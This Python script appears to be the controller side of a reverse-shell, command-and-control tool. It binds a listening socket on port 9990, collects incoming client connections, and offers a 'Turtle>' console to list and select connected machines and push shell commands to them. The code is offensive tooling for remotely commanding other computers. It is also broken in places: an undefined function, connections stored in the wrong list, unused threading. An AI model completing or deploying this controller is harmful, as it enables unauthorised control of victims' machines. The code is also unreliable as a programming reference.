import socket
import threading
import sys
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1,2]
queue = Queue()
all_connections = []
all_address = []

# Create Socket
def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 9990
        s = socket.socket()
    except socket.error as msg:
        print("Socket Creation Error: "+str(msg))

# Bind_socket to port and wait for connetcion from client
def socket_bind():
    try:
        global host
        global port
        global s
        print("Bindding socket to port"+str(port))
        s.bind((host,port))
        s.listen(5)
    except socket.error as msg:
        print("Socket Binding Error:"+str(msg) +"\n"+"Retrying...")
        socket_bind() # 연결 실패시 다시 연결

# Establish a Connection with Client(socket must be listening for them)
def scoket_accpet():
    conn,address = s.accept()
    print("Connection has been Established |"+"IP "+address[0] +"| Port"
          +str(address[1]))
    send_commands(conn)
    conn.close()

# Send_commands
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf8")
            print(client_response,end="")

# Accept Connections from multiple clients and save to list
def accpet_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_address[:]
    while True:
        try:
            conn,address = s.accept()
            conn.setblocking(1)
            all_address.append(conn)
            all_address.append(address)
            print("\nConnections has ben established:"+address[0])
        except:
            print("Error Accepting Connections")

# Displays all Current Connections
def list_connections():
    results = ''
    for i,conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(2048)
        except:
            del all_connections[i]
            del all_address[i]
            continue
        results += str(i) + '   '+str(all_address[i][0])+ '   '+str(all_address[i][1])+'\n'
    print('----- Clients ------' +'\n'+results)

def start_turtle():
    cmd = input("Turtle>")
    if cmd in "list":
        list_connections()

    elif "select" in cmd:
        conn = get_target(cmd)
        if conn is not None:
            send_target_commands(conn)
    else:
        print("Command not Recognized")


def get_target(cmd):
    try:
        target = cmd.replace("select ",'')
        target = int(target)
        conn = all_connections[target]
        print("You are now Connected to "+str(all_address[target][0]))
        print(str(all_address[target][0]) +'>',end="")
        return conn
    except:
        print("Not a Valid Selection")
        return None


def main():

    socket_create()
    socket_bind()
    start_turtle()
    scoket_accpet()

main()